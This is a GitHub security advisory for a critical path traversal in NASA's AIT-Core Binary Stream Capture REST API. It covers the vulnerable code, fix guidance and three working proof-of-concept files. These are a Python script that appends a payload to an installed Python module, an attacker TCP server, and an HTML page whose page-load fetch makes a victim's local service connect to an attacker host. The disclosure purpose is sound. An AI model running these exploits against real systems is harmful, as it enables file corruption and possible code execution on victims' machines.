# [C] NASA AMMOS Instrument Toolkit: Path traversal resulting in arbitrary file append (can be triggered over the network by unauthenticated attacker)

## Summary
Severity: Critical
Advisory: GHSA-p462-prxw-mjx4
CVE: CVE-2026-47731
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-06-05
Source: https://github.com/advisories/GHSA-p462-prxw-mjx4
Type: github-advisory

## Affected
- PyPI: `ait-core` — affected >=3.1.0 <3.1.1
- PyPI: `ait-core` — affected >=0 <2.6.1

## Details
## 1. Summary

The Binary Stream Capture (BSC) component exposes an unauthenticated HTTP API for dynamically creating packet capture “handlers.” Because the code blindly trusts path‑related form fields, a remote client can:

- **Bypass the configured log root** and direct BSC to log to **arbitrary filesystem paths** (path traversal / directory escape), and
- **Append attacker‑controlled data** to those files, using the privileges of the`ait-bsc` process.

There are two ways for a remote attacker to trigger this:
1. If the attacker has access to the network where `ait-bsc` is deployed (a reason for that could be that the ports are publicly accessible), the payloads can be directly sent to the server to trigger the arbitrary file append. This type of attack is demonstrated in `python_poc.py`.
2. Even if the attacker does not have direct access to the network because the software is running in a local network, it is possible to exploit this if a bad actor in that network opens an attacker-controlled website (which might be a website created by an attacker, or a third-party website compromised by the attacker). The browser javascript can automatically send the requests necessary to exploit this into the local network. This is even possible if the server is only accessible on `localhost`. This type of attack is demonstrated by `attacker_tcp.py` and `test1.html` (first launch the attacker TCP server, then start a webserver to host `test1.html`, for example using `python3 -m http.server 7000`,
 and open `test1.html`).  

### Impact

This issue affects BSC (Binary Stream Capture) and usage of the ait-bsc server. This impacts AIT-Core versions before 3.1.1, from 2.x before 2.6.1. Users are recommended to upgrade to version 3.1.1 or 2.6.1.

#### Details

A remote attacker can use this vulnerability to append data to arbitrary files on the system (if the `ait-bsc` has privileges to write to them). It is easy to use this to corrupt data on the system (which can include the AIT-Core python code to crash the server after it is restarted and python attempts to execute the corrupted code). It should be mentioned here that there seems to be a bug in the TCP handler that results in a lot of data being written in an infinite loop after the connection has been closed, this could result in excessive disk space use. That the attacker can modify executable files like python or bash scripts means that this vulnerability could also lead to Remote Code Execution as soon as the user runs the modified code. However, depending on the system, it is not so easy to execute this attack in practice (it might not be possible), because `ait-bsc` adds a header in front of attacker-controlled data. 

### Fix Information

The vulnerability is mitigated by constraining BSC ability to write paths only in the project root log directory which is configured through the bsc.yaml. Additionally, any attempts to traverse outside of the configured location are rejected.

### Patches

- 3.1.1
- 2.6.1

---

## 2. Affected Code Paths

### 2.1 REST entry point: `/NAME/start`

`StreamCaptureManagerServer` exposes an unauthenticated POST endpoint:

```python
# ait/core/bsc.py

class StreamCaptureManagerServer(Bottle):
    def _route(self):
        self._app.route("/", method="GET", callback=self._get_logger_list)
        self._app.route("/stats", method="GET", callback=self._fetch_handler_stats)
        self._app.route(
            "/<name>/start", method="POST", callback=self._add_logger_by_name
        )
        self._app.route(
            "/<name>/stop", method="DELETE", callback=self._stop_logger_by_name
        )
        ...
```

Handler:
```python
def _add_logger_by_name(self, name):
    ...
    data = dict(request.forms)
    loc = data.pop("loc", "")
    port = data.pop("port", None)
    conn_type = data.pop("conn_type", None)

    if not port or not conn_type:
        raise ValueError("Port and/or conn_type not set")

    address = [loc, int(port)]

    if "rotate_log" in data:
        data["rotate_log"] = True if data == "true" else False

    if "rotate_log_delta" in data:
        data["rotate_log_delta"] = int(data["rotate_log_delta"])

    self._logger_manager.add_logger(name, address, conn_type, **data)
```

All form fields except `loc`, `port`, `conn_type` are passed directly as `**data` into add_logger.
This includes attacker‑controlled `path`, `file_name_pattern`, and potentially `log_dir_path`.
There is no authentication on this route.

### 2.2 Manager: unvalidated `path` and `log_dir_path`
`StreamCaptureManager.add_logger`:
```python
# ait/core/bsc.py

def add_logger(self, name, address, conn_type, log_dir_path=None, **kwargs):
    capture_handler_conf = kwargs

    if not log_dir_path:
        log_dir_path = self._mngr_conf["root_log_directory"]

    log_dir_path = os.path.normpath(os.path.expanduser(log_dir_path))

    capture_handler_conf["log_dir"] = log_dir_path
    capture_handler_conf["name"] = name
    if "rotate_log" not in capture_handler_conf:
        capture_handler_conf["rotate_log"] = True

    ...
    address_key = str(address)
    if address_key in self._stream_capturers:
        capturer = self._stream_capturers[address_key][0]
        capturer.add_handler(capture_handler_conf)
        return

    socket_logger = SocketStreamCapturer(capture_handler_conf, address, conn_type)
    greenlet = gevent.spawn(socket_logger.socket_monitor_loop)
    self._stream_capturers[address_key] = (socket_logger, greenlet)
    self._pool.add(greenlet)
```

Key points:

- If the REST client supplies `log_dir_path` explicitly (as a named parameter), it overrides the manager’s `root_log_directory`.
- All other attacker‑supplied fields in `kwargs` become part of the handler configuration dict (`capture_handler_conf`), including `path` and `file_name_pattern`.
- There is **no** check that `log_dir_path` or `path` are relative or confined.

### 2.3 Path traversal via `_get_log_file`

`SocketStreamCapturer._get_log_file` builds the actual log path:

```python
# ait/core/bsc.py

def _get_log_file(self, handler):
    """Generate log file path for a given handler"""
    if "file_name_pattern" not in handler:
        filename = "%Y-%m-%d-%H-%M-%S-{name}.pcap"
    else:
        filename = handler["file_name_pattern"]

    log_file = handler["log_dir"]
    if "path" in handler:
        log_file = os.path.join(log_file, handler["path"], filename)
    else:
        log_file = os.path.join(log_file, filename)

    log_file = time.strftime(log_file, time.gmtime())
    log_file = log_file.format(**handler)

    return log_file
```

On POSIX systems:

- If `handler["path"]` is **absolute** (e.g. `/home/user/...`), `os.path.join(base, abs_component, ...)` discards the `base` component:

  ```python
  os.path.join("/configured/root", "/home/elias/ait-venv/...", "dmc.py")
  # -> "/home/elias/ait-venv/.../dmc.py"
  ```

- If `handler["path"]` contains `..`, the result can point **outside** the nominal root even if `path` is relative.

There is:

- No `os.path.realpath` canonicalization *after* join, and
- No enforcement that the final `log_file` begins with the configured root prefix.

Combined with `StreamCaptureManager.add_logger`, this means:

- Attacker controls both:
  - `handler["log_dir"]` (via `log_dir_path`), and
  - `handler["path"]` and `handler["file_name_pattern"]`.

They can therefore direct BSC’s log output to **any path that the OS permissions allow**, not just under `root_log_directory`.

### 2.4 File opened for append without safety checks

```python
# ait/core/bsc.py

def _get_logger(self, handler):
    """Initialize a PCAP stream for logging data"""
    log_file = self._get_log_file(handler)

    if not os.path.isdir(os.path.dirname(log_file)):
        os.makedirs(os.path.dirname(log_file))

    handler["log_rot_time"] = time.gmtime()
    return pcap.open(log_file, mode="a")
```

`pcap.open`:

```python
# ait/core/pcap.py

def open(filename, mode="r", **options):
    ...
    mode = mode.replace("b", "") + "b"  # "a" -> "ab"
    ...
    stream = PCapStream(builtins.open(filename, mode), mode)
    return stream
```

Consequences:

- If the target directory does not exist, `os.makedirs(os.path.dirname(log_file))` will **create it**, even if it is outside the intended root.
- The file is opened in append‑binary mode (`"ab"`):
  - The OS will create it if missing.
  - Existing content is preserved; new data is appended.
- There is no:
  - realpath‑based confinement,
  - symlink protection,
  - or additional access control beyond standard filesystem permissions.

### 2.5 A part of the data written is attacker‑controlled network payload

Captured data path:

```python
# ait/core/bsc.py

def capture_packet(self):
    """Write packet data to the logger's log file."""
    data = self.socket.recv(self._buffer_size)

    for h in self.capture_handlers:
        h["reads"] += 1
        h["data_read"] += len(data)

        d = data
        if "pre_write_transforms" in h:
            for data_transform in h["pre_write_transforms"]:
                d = data_transform(d)
        h["logger"].write(d)
```

`SocketStreamCapturer.__init__`:

- UDP:

  ```python
  if conn_type == "udp":
      self.socket = gevent.socket.socket(AF_INET, SOCK_DGRAM)
      self.socket.bind((address[0], address[1]))
  ```

- TCP:

  ```python
  elif conn_type == "tcp":
      self.socket = gevent.socket.socket(AF_INET, SOCK_STREAM)
      self.socket.connect((address[0], address[1]))
  ```

Thus:

- For UDP, any host that can send datagrams to the configured (IP,port) directly controls `data`.
- For TCP, the remote server at `(loc, port)` directly controls `data`.

`PCapStream.write` wraps this `data` in a PCAP packet header and writes it to the file, but does not sanitize or transform the payload bytes beyond optional in‑process transforms.

---

## 3. Recommendations

The core objective is to ensure that untrusted REST input cannot steer log file paths outside a trusted directory tree.

### 3.1 Constrain log paths to a trusted root

- In `StreamCaptureManager.add_logger` and/or `SocketStreamCapturer._get_log_file`:

  1. Compute a canonical root:

     ```python
     root = os.path.realpath(self._mngr_conf["root_log_directory"])
     ```

  3. When applying `path` and `file_name_pattern`, always join relative to this root; do **not** accept absolute `path` from REST:

     ```python
     user_path = handler.get("path", "")
     # force relative
     user_path = user_path.lstrip(os.sep)
     candidate = os.path.realpath(os.path.join(root, user_path, filename))
     ```

  4. Enforce the prefix:

     ```python
     if not (candidate == root or candidate.startswith(root + os.sep)):
         raise ValueError("Invalid log path; must remain under root_log_directory")
     ```

- Reject any REST‑supplied `log_dir_path` that is absolute or attempts to escape the configured root, or disallow `log_dir_path` entirely in REST calls.

### 3.2 Treat REST input as untrusted

- Only allow `path` / `file_name_pattern` override from the configuration file (`bsc.yaml`), not from REST.
- For REST‑created handlers, either:

  - Use a fixed subdirectory under the configured root, or
  - Validate `path` strictly as a simple relative name with no `/` or `..`.

### 3.3 Note on `/tmp` usage

- While not the root cause of this vulnerability, using a world‑writable directory such as `/tmp` as a log root in a multi‑user system is generally unsafe (standard symlink and race issues).
- It is recommended to:

  - Use a dedicated, non‑world‑writable directory for BSC logs (e.g. `/var/opt/ait-bsc/logs`).
  - Update the documentation examples to reflect this and add a warning against `/tmp` for production use.

### 3.4 Harden open calls

- If symlink attacks are a concern in specific deployments, consider to not follow them when writing to log files.

### 3.5 REST API exposure

- Because `/NAME/start` directly controls file paths and network connections:

  - It should **not** be exposed to untrusted networks.
  - Consider adding optional HTTP authentication or limiting binding to a protected interface or Unix domain socket.
  
 ## 4 Proof of concept files
  
 ### 4.1 `python_poc.py`
```python
#!/usr/bin/env python3
"""
AIT-Core BSC path traversal & arbitrary file append PoC (UDP, timed header).

Assumptions:
- ait-core and requests are installed.
- ait-bsc is running on 127.0.0.1:8080 with a bsc.yaml including:

    capture_manager:
      root_log_directory: /tmp
      manager_server:
        host: localhost
        port: 8080
    handlers: []

What this script does:
1) Uses the BSC REST API to create a conn_type=udp handler that:
     - binds a UDP socket on UDP_PORT, and
     - logs to TARGET_PATH, which is OUTSIDE /tmp via 'path'.
2) Waits until the current UNIX time satisfies (ts_sec & 0xFF) == 0
   (low byte of ts_sec == 0) and sends a UDP PAYLOAD right then.
   On little-endian, this makes the FIRST BYTE of the PCAP packet header
   (ts_sec low byte) 0x00 with high probability.
3) Shows that TARGET_PATH (outside /tmp) exists and contains the payload.
4) DELETEs the handler so you can rerun the script without restarting ait-bsc.

Note:
- The script does NOT delete or truncate TARGET_PATH.
- If TARGET_PATH already exists, ait-bsc will append a new PCAP packet
  (header + payload) at the end of the file.
"""

import os
import socket
import time

import requests

# BSC REST API base URL
BSC_BASE_URL = "http://127.0.0.1:8080"

# UDP capture parameters
UDP_PORT = 9999
HANDLER_NAME = "traversal-udp-poc-timed"
CONN_TYPE = "udp"

# Target directory and file OUTSIDE /tmp
HOME = os.path.expanduser("~")
TARGET_DIR = "/home/elias/ait-venv/lib/python3.10/site-packages/ait/core/"
TARGET_FILE = "dmc.py"
TARGET_PATH = os.path.join(TARGET_DIR, TARGET_FILE)

# Payload to be sent in the UDP datagram
PAYLOAD = b"ATTACK_PAYLOAD_UDP_TIMED_12345"


def wait_for_first_header_byte_zero():
    """
    Wait until the low byte of the current UNIX seconds is 0.

    PCapPacketHeader.pack() writes ts_sec first, and on little-endian systems
    the first byte in the file is ts_sec & 0xFF. We wait for ts_sec % 256 == 0
    and for the fractional part of the second to be small.
    """
    print("[*] Waiting for ts_sec & 0xFF == 0 (may take up to ~4m16s)...")
    while True:
        now = time.time()
        ts_sec = int(now)
        # Condition: low byte zero and we are in the first 200ms of this second
        if (ts_sec & 0xFF) == 0 and (now - ts_sec) < 0.2:
            print(f"[+] Condition met: ts_sec={ts_sec}, low byte=0x00")
            return
        time.sleep(0.01)


def create_udp_handler():
    """
    Use BSC REST API to create a UDP handler that binds on UDP_PORT and
    logs to TARGET_PATH, which is outside /tmp via the 'path' parameter.
    """
    data = {
        "loc": "",                  # bind on all interfaces
        "port": str(UDP_PORT),
        "conn_type": CONN_TYPE,
        "path": TARGET_DIR,         # ABSOLUTE path outside /tmp
        "file_name_pattern": TARGET_FILE,
    }
    url = f"{BSC_BASE_URL}/{HANDLER_NAME}/start"
    print(f"[+] Creating UDP handler via POST {url}")
    resp = requests.post(url, data=data)
    print(f"[+] Handler creation HTTP status: {resp.status_code}")
    if not (200 <= resp.status_code < 300):
        raise SystemExit(f"Handler creation failed: {resp.status_code} {resp.text!r}")


def send_udp_payload_timed():
    """
    Wait for the desired timestamp condition, then send the UDP payload
    to the handler's bound UDP port.
    """
    wait_for_first_header_byte_zero()
    print(f"[+] Sending timed UDP payload to 127.0.0.1:{UDP_PORT}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(PAYLOAD, ("127.0.0.1", UDP_PORT))
    finally:
        sock.close()
    # Give ait-bsc a moment to recv and write
    time.sleep(0.5)


def stop_udp_handler():
    """
    Stop the handler so the script can be rerun without restarting ait-bsc.
    """
    url = f"{BSC_BASE_URL}/{HANDLER_NAME}/stop"
    try:
        resp = requests.delete(url, timeout=2)
        print(f"[+] DELETE {url} -> HTTP {resp.status_code}")
    except Exception as e:
        print(f"[!] Failed to DELETE handler: {e!r}")


def show_result():
    """
    Display hex+ASCII view of the first bytes of TARGET_PATH.
    """
    if not os.path.exists(TARGET_PATH):
        print(f"[!] Target file does not exist: {TARGET_PATH}")
        print("    ait-bsc did not create/write the file \u2014 check config and that ait-bsc is running.")
        return

    print(f"[+] Target file was created or appended by ait-bsc: {TARGET_PATH}")
    data = open(TARGET_PATH, "rb").read()
    print(f"[+] Target file size: {len(data)} bytes")

    def chunked(seq, size):
        for i in range(0, len(seq), size):
            yield i, seq[i : i + size]

    print("[+] First bytes of file (hex + ASCII):")
    for offset, chunk in chunked(data, 16):
        hex_bytes = " ".join(f"{b:02x}" for b in chunk)
        ascii_bytes = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"{offset:08x}  {hex_bytes:<47}  |{ascii_bytes}|")
        if offset >= 96:
            break

    if PAYLOAD in data:
        print("[+] CONFIRMED: payload bytes are present in the file.")
    else:
        print("[!] Payload bytes not found (something went wrong).")


def main():
    print("[*] AIT-Core BSC path traversal & arbitrary file append PoC (UDP, timed header)")
    print(f"[*] BSC base URL : {BSC_BASE_URL}")
    print(f"[*] UDP port     : {UDP_PORT}")
    print(f"[*] TARGET_DIR   : {TARGET_DIR}")
    print(f"[*] TARGET_FILE  : {TARGET_FILE}")
    print(f"[*] FULL PATH    : {TARGET_PATH}")
    print()

    # We deliberately do NOT create TARGET_DIR or TARGET_PATH here.
    # ait-bsc will create the directory and file when it opens the log path.
    create_udp_handler()
    send_udp_payload_timed()
    show_result()
    stop_udp_handler()

    print()
    print("[*] If you see your PAYLOAD bytes in TARGET_PATH (which is not under /tmp),")
    print("[*] then BSC has written outside its configured root_log_directory via REST 'path' using UDP.")
    print("[*] The script also timed the send so the first packet header byte (ts_sec low byte) is likely 0x00.")


if __name__ == "__main__":
    main()
```

### 4.2 `attacker_tcp.py`
```python
#!/usr/bin/env python3
import socket

HOST = "0.0.0.0"    # attacker host interface
PORT = 9001         # must match 'port' you send to ait-bsc
PAYLOAD = b"ATTACK_PAYLOAD_FROM_ATTACKER_12345\n"

def main():
    print(f"[*] Attacker TCP server listening on {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((HOST, PORT))
        srv.listen(1)

        print("[*] Waiting for connection from ait-bsc...")
        bsc_sock, bsc_addr = srv.accept()
        print(f"[+] Got connection from ait-bsc at {bsc_addr}")

        with bsc_sock:
            print("[+] Sending payload to ait-bsc...")
            bsc_sock.sendall(PAYLOAD)
            print("[+] Payload sent, closing connection")

    print("[*] Done.")

if __name__ == "__main__":
    main()
```

### 4.3 `test1.html`
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>AIT-BSC Path Traversal PoC (Browser + TCP)</title>
</head>
<body>
<script>
(function () {
  // AIT-BSC REST API on the victim
  const BSC_URL      = "http://127.0.0.1:8080";
  const HANDLER_NAME = "traversal-tcp-from-browser";

  // Attacker TCP server (remote)
  const ATTACKER_HOST = "192.168.1.184";  // change to real host/IP
  const ATTACKER_PORT = 9001;                    // must match Python server

  // Target file on the victim (outside /tmp)
  const TARGET_DIR  = "/home/elias/ait-venv/lib/python3.10/site-packages/ait/core/";
  const TARGET_FILE = "dmc.py";

  function startHandler() {
    // Tell ait-bsc to:
    //  - connect via TCP to ATTACKER_HOST:ATTACKER_PORT
    //  - log to TARGET_DIR/TARGET_FILE (escape /tmp via 'path')
    const params = new URLSearchParams();
    params.set("loc", ATTACKER_HOST);
    params.set("port", String(ATTACKER_PORT));
    params.set("conn_type", "tcp");
    params.set("path", TARGET_DIR);
    params.set("file_name_pattern", TARGET_FILE);

    fetch(`${BSC_URL}/${HANDLER_NAME}/start`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: params.toString(),
      mode: "no-cors"  // we don't care about reading the response
    }).catch(() => {});
  }

  // On page load, just start the handler. The attacker TCP server
  // will send the payload as soon as ait-bsc connects.
  window.addEventListener("load", startHandler);
})();
</script>
</body>
</html>
```

## References
- https://github.com/NASA-AMMOS/AIT-Core/security/advisories/GHSA-p462-prxw-mjx4
- https://github.com/NASA-AMMOS/AIT-Core
- https://github.com/NASA-AMMOS/AIT-Core/releases/tag/2.6.1
- https://github.com/NASA-AMMOS/AIT-Core/releases/tag/3.1.1
